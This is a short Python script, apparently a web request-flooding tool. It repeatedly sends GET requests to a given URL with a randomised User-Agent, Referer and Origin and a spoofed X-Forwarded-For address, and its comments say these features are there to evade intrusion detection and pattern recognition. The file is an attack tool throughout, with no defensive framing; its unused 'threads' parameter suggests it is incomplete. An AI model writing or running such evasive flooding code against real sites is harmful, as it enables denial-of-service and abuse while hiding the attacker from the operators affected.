import random
import requests
from time import sleep
import string

# Function to generate random User-Agent for Header Spoofing
def random_user_agent():
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
        "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36",
        "Mozilla/5.0 (Linux; Android 10; SM-A505FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/82.0.4085.127 Mobile Safari/537.36"
    ]
    return random.choice(user_agents)

# Spoofing the X-Forwarded-For header (IP Spoofing)
def spoof_x_forwarded_for():
    ip = f"192.168.{random.randint(0, 255)}.{random.randint(0, 255)}"
    return ip

# Generate a random URL path to avoid pattern recognition
def random_url_path():
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))

# Use Referer and Origin headers to make the request look more legitimate
def generate_referer():
    return f"https://www.example.com/{random_url_path()}"

def generate_origin():
    return f"https://www.example.com/{random_url_path()}"

# Function to simulate attack with headers and random timing
def send_sophisticated_request(url, threads, time_duration):
    headers = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'keep-alive',
        'Cache-Control': 'max-age=0',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': random_user_agent(),  # Randomize User-Agent
        'Referer': generate_referer(),  # Randomize Referer
        'X-Forwarded-For': spoof_x_forwarded_for(),  # IP Spoofing
        'Origin': generate_origin(),  # Randomize Origin
        'X-Requested-With': 'XMLHttpRequest',  # To make the request look like an AJAX request
        'Content-Type': 'application/x-www-form-urlencoded',  # Common Content-Type for avoiding detection
    }

    # Loop for sending requests for the given duration and number of threads
    for _ in range(time_duration):
        try:
            # Randomized timing to avoid detection by IDS/IPS
            sleep_time = random.uniform(0.1, 0.5)  # Random sleep to avoid pattern recognition
            response = requests.get(url, headers=headers, timeout=5)
            print(f"Sent request to {url} with status: {response.status_code}")
            sleep(sleep_time)  # Adding a delay between requests

        except requests.exceptions.RequestException as e:
            print(f"Error: {str(e)}")
